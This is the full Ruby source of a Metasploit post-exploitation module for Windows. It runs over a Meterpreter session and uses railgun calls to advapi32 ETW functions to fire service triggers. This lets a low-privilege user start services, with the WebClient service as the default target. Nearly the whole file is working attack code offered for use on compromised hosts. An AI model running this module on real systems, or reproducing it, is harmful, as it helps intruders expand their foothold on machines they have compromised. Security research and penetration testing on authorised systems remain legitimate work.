###
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
### Tested on win10 64bit

# TODO Lots of error checking, also we could check and list every service that could be used.
class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Service Trigger Activation (ETW)',
        'Description'   => %q{
          This module uses service triggers (ETW) to start a service as a lower privilege user.
          Be careful to make sure you are on a proper meterp session, aka 64 => 64 otherwise
          you might crash your session. To get the guid for a service execute
          sc.exe qtriggerinfo servicename, you are looking for the ETW Provider GUID.
          This module could also have other uses!
        },
        'License'       => MSF_LICENSE,
        'Author'        => ['vvalien'],
        'Platform'      => 'win',
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options([
      OptString.new( 'GUID_TRIGGER',  [ true, 'The GUID to trigger', '22b6d684-fa63-4578-87c9-effcbe6643c7']) #WebClient
      ], self.class)
  end

  def run
    # set the guid
    guid = datastore['GUID_TRIGGER']
    guid = guid_magic(guid)
    print_status("Loading railgun")
    load_railgun
    print_status("Registering event..")
    fire_railgun(guid)
    print_good("Finished")
  end

  def guid_magic(guid)
    aguid = guid.gsub(/\-/,"")
    sguid = aguid[6,2] + aguid[4,2] + aguid[2,2] + aguid[0,2]
    sguid << aguid[10,2] +  aguid[8,2] + aguid[14,2] + aguid[12,2] + aguid[16,4]
    sguid << aguid[20,12]
    sguid = [sguid].pack("H*")
    return sguid
  end


  def load_railgun()
    # Add the EventRegister function
    # https://msdn.microsoft.com/en-us/library/windows/desktop/aa363744%28v=vs.85%29.aspx
    client.railgun.add_function('advapi32', 'EventRegister', 'DWORD',[
        ['PBLOB', 'ProviderId', 'in'],
        ['LPVOID', 'EnableCallback', 'inout'],
        ['LPVOID', 'CallbackContext', 'inout'],
        ['PDWORD', 'RegHandle', 'out'],
    ])

    # Add the EventWriteString function, could also be EventWrite
    # https://msdn.microsoft.com/is-is/library/windows/desktop/aa363750%28v=vs.85%29.aspx
    client.railgun.add_function('advapi32', 'EventWriteString', 'DWORD',[
        ['HANDLE', 'RegHandle', 'in'],
        ['DWORD', 'Level', 'in'],
        ['DWORD', 'Keyword', 'in'],
        ['PCHAR', 'String', 'in'],
    ])

    # https://msdn.microsoft.com/en-us/library/windows/desktop/aa363749%28v=vs.85%29.aspx
    client.railgun.add_function('advapi32', 'EventUnregister', 'DWORD',[
        ['HANDLE', 'RegHandle', 'in'],
    ])
  end

  def fire_railgun(guid)
    # Register the event and get back the handle
    evnt = client.railgun.advapi32.EventRegister(guid,nil,nil,4)
    # Use the handle to write our eventstring!
    client.railgun.advapi32.EventWriteString(evnt['RegHandle'], nil, nil, '')
    # Unregister to clean it up
    client.railgun.advapi32.EventUnregister(evnt['RegHandle'])
  end
end
